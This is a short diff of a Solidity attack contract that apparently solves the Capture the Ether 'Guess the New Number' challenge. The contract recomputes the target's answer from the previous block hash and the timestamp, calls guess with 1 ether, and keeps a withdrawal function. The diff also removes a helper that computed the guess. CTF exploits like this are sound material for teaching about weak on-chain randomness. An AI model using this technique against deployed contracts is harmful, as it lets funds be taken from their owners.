@@ -23,7 +23,7 @@ contract GuessTheNewNumberChallengeCall {
         _;
     }
 
-    //function callFuct(address addr) public payable {
+    //攻击func ,并且调用
     function callFuct(address addr) public payable {
         require(addr != address(0), "Address can not be Zero");
         uint8 an = uint8(
@@ -38,20 +38,6 @@ contract GuessTheNewNumberChallengeCall {
         );
         _interface = GuessTheNewNumberChallenge(addr);
         _interface.guess{value: 1 ether}(an);
-    }
-
-    function get_guess() public view returns (uint8) {
-        uint8 an = uint8(
-            uint256(
-                keccak256(
-                    abi.encodePacked(
-                        blockhash(block.number - 1),
-                        block.timestamp
-                    )
-                )
-            )
-        );
-        return an;
     }
 
     // 为了能从攻击合约中，取回eth
